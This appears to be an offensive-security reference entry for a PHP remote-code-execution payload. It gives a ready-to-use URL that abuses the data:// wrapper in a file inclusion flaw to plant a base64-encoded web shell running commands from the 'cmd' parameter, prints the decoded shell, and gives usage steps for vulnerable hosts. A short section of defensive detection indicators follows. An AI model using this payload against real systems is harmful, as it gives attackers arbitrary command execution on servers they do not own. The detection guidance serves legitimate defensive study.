---
type: code
language: php
verified: true
tags:
  - rce
  - payload
  - data-wrapper
  - lfi
platforms:
  - Web
  - PHP
validated: true
---

# PHP-System-Shell-via-Data-Wrapper

## Code

```url
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

## Description

This code snippet is a URL that embeds a base64-encoded PHP one-liner for a basic web shell using the data:// wrapper. When included by a vulnerable PHP application, it executes the payload, allowing arbitrary system commands via the 'cmd' GET parameter. The wrapper treats the base64 data as a local file stream, enabling LFI-style inclusion without accessing actual files.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| example.net | Target domain with vulnerable inclusion | target.com |
| cmd | GET parameter for commands to execute | ls -la |

## Usage

Replace 'example.net' with the vulnerable host and access the URL in a browser or via curl. Append ?cmd=[command] to run system commands. Use in LFI/RFI scenarios where direct PHP file access is blocked but data:// is allowed. Ideal for initial RCE in web apps.

## Detection

- WAF rules matching base64 in query parameters or data:// URIs.
- PHP error logs showing inclusion of non-existent files with data:// protocol.
- Network logs for requests with long base64 strings in URLs.
- Server-side execution traces for unexpected system calls from web context.

## Related

- [[procedures/Exploit-Data-Wrapper-for-LFI-RFI]]
